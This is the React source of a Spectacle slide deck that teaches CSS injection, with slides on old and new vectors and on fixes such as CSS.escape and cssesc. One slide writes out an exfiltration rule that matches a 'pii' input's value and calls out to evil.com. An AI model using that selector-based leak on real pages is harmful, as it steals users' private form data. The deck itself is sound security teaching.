import React, { Component } from 'react';

import {
    BlockQuote,
    Cite,
    Deck,
    Heading,
    ListItem,
    List,
    Quote,
    Slide,
    Text,
    Appear,
    CodePane,
    Layout,
    Fill
  } from 'spectacle';

  import createTheme from 'spectacle/lib/themes/default';
  const theme = createTheme(
    {
      primary: 'white',
      secondary: '#1F2022',
      tertiary: '#03A9FC',
      quartenary: '#CECECE',
    },
    {
      primary: 'Montserrat',
      secondary: 'Helvetica',
    }
  );

export default class Presentation extends Component {
    render() {
        return(
            <Deck
                contentWidth={1500}
                transition={['zoom', 'slide']}
                transitionDuration={500}
                theme={theme}
                progress="bar">

                {/* Title */}
                <Slide>
                    <Heading size={1} caps lineHeight={1}>
                        Ain't no REST
                    </Heading>
                    <Heading size={2}>
                        for the wicked
                    </Heading>
                </Slide>

                <Slide>
                    <Text>
                        Darrien Rushing
                    </Text>
                    <br />
                    <Text>
                        <a href="https://github.com/meddlin">https://github.com/meddlin</a>
                    </Text>
                </Slide>

                {/* What is CSS Injection? */}
                <Slide>
                    <Heading size={4}>What is CSS Injection?</Heading>

                    <Text>Similar to XSS...except you're only using CSS</Text>

                    <br />
                    <Text>
                        not evil --> <code>color: #FF0000;</code>
                    </Text>
                    <br />
                    <Text>
                        very evil --> <code>{`input[name="pii"][value="a"] {`}</code>
                    </Text>
                    <Text>
                        <code>{`color: url('https://`}</code>
                        <code style={{ color: 'red'}}>{`evil`}</code>
                        <code>{`.com/a')}`}</code>
                    </Text>
                </Slide>

                <Slide>
                    <Text>Why would you even allow this?! Seems kind of obvious right?...</Text>
                </Slide>

                {/* What's old is new again! */}
                <Slide>
                    <Heading size={4}>What's "old" is new again! ಠ_ಠ</Heading>

                    <div style={{ display: 'flex', flexDirection: 'row', justifyContent: 'space-between' }}>
                            <div>
                                <Text textColor="tertiary">Old</Text>
                                <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                                    <List>
                                        <Text>> XBL</Text>
                                        <Text>> HTC</Text>
                                        <Text>> <code>url()</code> w/ JS protocol</Text>
                                    </List>
                                </div>
                            </div>

                            <div>
                                <Text textColor="tertiary">New</Text>
                                <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                                    <List>
                                        <Text>> JS frameworks mean new toys!</Text>
                                        <Text>> <i>if</i> React: JSX => JS + XML/HTML</Text>
                                        <Text>> <i>then</i> 'styled components': JSX + CSS</Text>
                                    </List>
                                </div>
                            </div>
                    </div>
                </Slide>

                <Slide>
                    <Heading size={4}>The Fix</Heading>

                    <div style={{ display: 'flex', justifyContent: 'center', alignContent: 'center' }}>
                        <List>
                            <Text>> CSS.escape() {`<-- Chrome 46+, FF 31+, Edge (x)`}</Text>
                            <Text>> <code>npm i cssesc</code></Text>
                            <Text>> "Don't trust user input."</Text>
                        </List>
                    </div>
                </Slide>

                {/* The Difference */}
                {/* <Slide>
                    <Text>
                        <code>
                        {`
                        const ProfileImage = styled.div
                            width: 100px;
                            height: 100px;
                            background: ${props => props.background ? props.background : 'none'}
                        ;
                        `}
                        </code>
                    </Text>
                </Slide> */}
            </Deck>
        );
    }
}